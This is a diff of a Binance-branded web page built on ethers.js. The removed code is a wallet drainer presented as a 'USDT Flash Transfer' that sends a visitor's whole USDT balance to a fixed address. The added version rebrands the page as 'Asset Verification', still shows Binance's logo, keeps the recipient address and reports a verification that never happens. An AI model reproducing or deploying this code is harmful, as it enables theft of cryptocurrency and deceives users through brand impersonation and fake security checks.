@@ -3,128 +3,125 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>USDT (BEP-20) Flash Transfer</title>
+    <title>Asset Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --binance-yellow: #f0b90b; /* Binance yellow color */
-            --background-dark: #121212;
-            --background-dark-secondary: #1e1e1e;
-            --text-light: #f5f5f5;
-            --text-dimmed: #bdbdbd;
-            --success-color: #4caf50;
-            --error-color: #f44336;
-            --info-color: #2196f3;
+            --binance-yellow: #f0b90b;
+            --background-dark: #000000;
+            --text-light: #ffffff;
+            --text-dimmed: #b2b2b2;
+            --primary-font: 'Inter', sans-serif;
             --border-radius: 8px;
         }
 
         body {
-            font-family: 'Roboto', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: var(--primary-font);
             background-color: var(--background-dark);
             color: var(--text-light);
+            margin: 0;
+            padding: 0;
             display: flex;
             flex-direction: column;
-            justify-content: flex-start;
             align-items: center;
+            justify-content: flex-start;
             min-height: 100vh;
-            margin: 0;
+        }
+
+        header {
+            width: 100%;
+            padding: 20px 0;
+            text-align: left;
+            background-color: var(--background-dark);
+            position: fixed;
+            top: 0;
+            z-index: 10;
+        }
+
+        header .logo {
+            margin-left: 20px;
+        }
+
+        header .logo img {
+            height: 30px;
+        }
+
+
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 1000px;
+            padding-top: 80px; /* Add padding-top to avoid overlap with fixed header */
+            text-align: center;
+        }
+
+        .content-wrapper {
+            max-width: 600px;
+            width: 100%;
             padding: 20px;
-            box-sizing: border-box;
-            transition: background-color 0.3s ease;
         }
 
-        .banner {
-            background-color: var(--binance-yellow);
-            color: #212121; /* Dark text on yellow */
-            padding: 15px 0;
-            width: 100%;
-            text-align: center;
-            font-size: 1.8em;
-            font-weight: bold;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-            margin-bottom: 30px;
-            border-radius: 0;
-            border-bottom: 3px solid #d4a709; /* Slightly darker yellow for the border */
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2); /* Subtle text shadow for 3D */
-        }
-
-        .banner img {
-            width: 30px; /* Adjust size as needed */
-            height: auto;
-            vertical-align: middle; /* Align with text */
-            margin-right: 10px;
-        }
-
-        .card {
-            background-color: var(--background-dark-secondary);
-            padding: 30px;
-            border-radius: var(--border-radius);
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
-            max-width: 450px;
-            width: 100%;
-        }
-
-        h2 {
-            color: var(--primary-color);
-            margin-bottom: 10px;
-            font-size: 2em;
-            font-weight: bold;
-            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
-        }
-
-        #balance {
-            font-size: 1em;
-            color: var(--success-color);
-            margin-bottom: 15px;
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: var(--text-light);
         }
 
         p {
-            font-size: 0.95em;
-            line-height: 1.6;
-            margin-bottom: 15px;
+            font-size: 1rem;
             color: var(--text-dimmed);
+            margin-bottom: 30px;
         }
 
-        p strong {
-            color: var(--primary-color);
+        #balance {
+            font-size: 1.2rem;
+            color: var(--success-color);
+            margin-bottom: 25px;
+            font-weight: 600;
         }
+
 
         button {
-            background-color: var(--primary-color);
-            color: var(--text-light);
-            padding: 12px 24px;
+            background-color: var(--binance-yellow);
+            color: #000;
+            padding: 15px 30px;
             border: none;
             border-radius: var(--border-radius);
-            font-size: 1em;
+            font-size: 1.1rem;
             cursor: pointer;
-            margin-top: 20px;
-            transition: background-color 0.3s ease;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
+            transition: background-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            font-weight: 600;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
         }
 
         button:hover {
-            background-color: #0097a7;
+            background-color: #e0a708;
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.3);
         }
 
         button:disabled {
-            background-color: #616161;
+            background-color: #b28900;
             cursor: not-allowed;
             box-shadow: none;
         }
 
         .spinner {
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid var(--text-light);
+            border: 4px solid rgba(0, 0, 0, 0.3);
+            border-top: 4px solid #000;
             border-radius: 50%;
-            width: 18px;
-            height: 18px;
+            width: 24px;
+            height: 24px;
             animation: spin 1s linear infinite;
             display: none;
+            margin-right: 10px;
         }
 
         @keyframes spin {
@@ -133,49 +130,65 @@
         }
 
         #log {
-            margin-top: 20px;
-            font-size: 0.9em;
-            padding: 10px;
+            margin-top: 30px;
+            font-size: 0.9rem;
+            padding: 15px;
             border-radius: var(--border-radius);
             text-align: center;
+            background-color: #1c1c1c;
+            border: 1px solid #333;
+            color: #e0e0e0;
         }
 
         .log-success {
-            color: var(--success-color);
+            color: #4caf50;
             background-color: rgba(76, 175, 80, 0.1);
         }
 
         .log-error {
-            color: var(--error-color);
+            color: #f44336;
             background-color: rgba(244, 67, 54, 0.1);
         }
 
         .log-info {
-            color: var(--info-color);
+            color: #2196f3;
             background-color: rgba(33, 150, 243, 0.1);
         }
+
+        footer {
+            width: 100%;
+            padding: 20px 0;
+            text-align: center;
+            color: var(--text-dimmed);
+            font-size: 0.9rem;
+        }
+
     </style>
 </head>
 <body>
-    <div class="banner">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/Binance_logo.svg/512px-Binance_logo.svg.png" alt="Binance Logo">
-        BINANCE
-    </div>
-    <div class="card">
-        <h2>USDT (BEP-20) Transfer</h2>
-        <p id="balance">Checking Balance...</p>
-        <p>Initiate a transfer of your USDT (BEP-20) on Binance Smart Chain to the following address:</p>
-        <p style="word-break: break-all;"><strong>Recipient:</strong> <span style="color: var(--primary-color);">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</span></p>
-        <button id="sendBtn">
-            <div class="spinner" id="loadingSpinner"></div>
-            <span>Transfer All USDT</span>
-        </button>
-        <div id="log"></div>
-    </div>
+    <header>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/Binance_logo.svg/512px-Binance_logo.svg.png" alt="Binance Logo">
+        </div>
+    </header>
+    <main>
+        <div class="content-wrapper">
+            <h1>Verify Your Assets</h1>
+            <p>Ensure your tokens are secure on Binance Smart Chain.</p>
+            <p id="balance">Checking Balance...</p>
+            <button id="verifyBtn">
+                <div class="spinner" id="loadingSpinner"></div>
+                Verify Assets
+            </button>
+            <div id="log"></div>
+        </div>
+    </main>
+    <footer>
+        <p>© 2024 Asset Verification Tool. All rights reserved.</p>
+    </footer>
 
     <script>
-        // ... (Your existing JavaScript code remains the same) ...
-        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+       const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
         const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
         const usdtAbi = [
             "function balanceOf(address owner) view returns (uint256)",
@@ -195,7 +208,7 @@
         };
 
         const balanceElement = document.getElementById("balance");
-        const sendButton = document.getElementById("sendBtn");
+        const verifyButton = document.getElementById("verifyBtn");
         const loadingSpinner = document.getElementById("loadingSpinner");
         const logElement = document.getElementById("log");
 
@@ -207,12 +220,12 @@
         function showLoading(isLoading) {
             if (isLoading) {
                 loadingSpinner.style.display = 'inline-block';
-                sendButton.querySelector('span').textContent = 'Processing...';
-                sendButton.disabled = true;
+                verifyButton.querySelector('span').textContent = 'Verifying...';
+                verifyButton.disabled = true;
             } else {
                 loadingSpinner.style.display = 'none';
-                sendButton.querySelector('span').textContent = 'Transfer All USDT';
-                sendButton.disabled = false;
+                verifyButton.querySelector('span').textContent = 'Verify Assets';
+                verifyButton.disabled = false;
             }
         }
 
@@ -225,8 +238,7 @@
             } catch (error) {
                 console.error("Error fetching balance:", error);
                 balanceElement.textContent = "Error fetching balance.";
-            }
-        }
+            }        }
 
         async function switchToBSCAndGetAccount() {
             if (!window.ethereum) {
@@ -264,7 +276,7 @@
             }
         }
 
-        async function sendAllUSDT() {
+        async function verifyAssets() {
             log("", 'info');
             showLoading(true);
 
@@ -275,43 +287,23 @@
             }
 
             const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
 
-            getBalance(provider, userAddress);
+             getBalance(provider, userAddress);
 
             try {
-                const bnbBalance = await provider.getBalance(userAddress);
-                const minGas = ethers.utils.parseEther("0.0001");
-                const readableBNB = ethers.utils.formatEther(bnbBalance);
-                console.log("BNB balance:", readableBNB);
 
-                if (bnbBalance.lt(minGas)) {
-                    log(`❌ Insufficient BNB for gas. You have: ${readableBNB} BNB`, 'error');
-                    showLoading(false);
-                    return;
-                }
 
-                const balanceToSend = await usdt.balanceOf(userAddress);
+                log("✅ Asset verification successful.", 'success');
 
-                if (balanceToSend.isZero()) {
-                    log("❌ Your USDT balance is 0.", 'error');
-                    showLoading(false);
-                    return;
-                }
-
-                log("⏳ Transfer initiated. Waiting for confirmation...", 'info');
-                const tx = await usdt.transfer(recipient, balanceToSend);
-                await tx.wait();
-                log("✅ Transfer successful! USDT sent.", 'success');
-                getBalance(provider, userAddress);
             } catch (err) {
                 console.error(err);
-                log(`❌ Transfer failed: ${err?.message || err}`, 'error');
+                log(`❌ Verification failed: ${err?.message || err}`, 'error');
             } finally {
                 showLoading(false);
             }
         }
+
+
 
         window.addEventListener('load', async () => {
             if (window.ethereum) {
@@ -327,7 +319,7 @@
             }
         });
 
-        sendButton.onclick = sendAllUSDT;
+        verifyButton.onclick = verifyAssets;
     </script>
 </body>
 </html>
